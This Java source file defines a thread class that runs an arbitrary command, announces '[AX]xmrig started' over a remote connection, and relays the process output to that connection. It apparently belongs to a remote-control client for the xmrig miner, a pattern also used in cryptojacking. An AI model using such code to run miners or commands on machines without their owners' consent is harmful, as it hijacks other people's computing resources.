package client.main;


import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.nio.charset.Charset;
import java.util.Date;

/**
 * 一个命令行指令的执行对象
 * @author Rock Chin
 */
public class ProcessCmd extends Thread{
    /**
     * 公用计数器
     */
    public static int UID_COUNT=0;
    /**
     * 创建时执行的命令
     */
    public String cmd="";
    public String name="";//进程名字，与processlist中的key对应
    public long startTime=0;//此进程创建时间
    /**
     * 指向执行对象
     */
    public Process process=null;
    /**
     * 向执行对象写数据
     */
    public BufferedWriter processWriter=null;//向process写数据
    /**
     * 读取命令执行时的error
     */
    public CmdError cmdError=null;

    /**
     * 初始化执行对象
     * @param name
     */
    public ProcessCmd(String name){
        this.name=name;
        startTime=new Date().getTime();
    }

    /**
     * 储存本任务未被聚焦时命令行返回的消息
     */
    StringBuffer buffer=new StringBuffer("");
    /**
     * 线程中执行
     */
    public void run(){
        try{
            /**
             * 获取命令执行对象
             */
            process=Runtime.getRuntime().exec(cmd);
            processWriter=new BufferedWriter(new OutputStreamWriter(process.getOutputStream(),"GBK"));
            /**
             * 获取执行对象的错误消息的线程
             */
            cmdError=new CmdError(new BufferedReader(new InputStreamReader(process.getErrorStream(),"GBK")),this);
            cmdError.start();
            AXMain.connect.writeIgnoreExce("[AX]xmrig started");
            /**
             * 获取正常返回消息
             */
            BufferedReader xr=new BufferedReader(new InputStreamReader(process.getInputStream(),Charset.forName("GBK")));
            while(true){
                String line=xr.readLine();
                if (line.equalsIgnoreCase(""))
                    continue;
                if (AXMain.printToStdout)
                    System.out.println(line);
                AXMain.connect.writeIgnoreExce(line.replaceAll("\\e\\[[\\d;]*[^\\d;]",""));
            }
        }catch (Exception e){
        }
    }

}
